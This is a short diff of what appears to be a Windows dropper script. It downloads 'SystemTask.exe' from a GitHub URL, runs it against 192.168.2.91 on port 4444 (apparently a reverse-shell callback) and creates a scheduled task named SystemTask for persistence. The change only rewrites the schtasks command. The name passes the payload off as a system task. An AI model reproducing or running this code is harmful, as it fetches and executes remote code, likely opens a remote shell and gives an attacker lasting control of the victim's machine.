@@ -6,5 +6,5 @@ $url = 'https://raw.githubusercontent.com/Gh0st1nTh3Sh3ll1/SystemTask/master/Sys
 $file = 'SystemTask.exe'
 $client.DownloadFile($url,$file)
 SystemTask.exe "192.168.2.91" "4444"
-powershell -command "& {schtasks.exe /create /tn SystemTask /xml SystemTask.xml}"
-exit
+schtasks.exe ^/create ^/tn SystemTask ^/xml SystemTask.xml
+
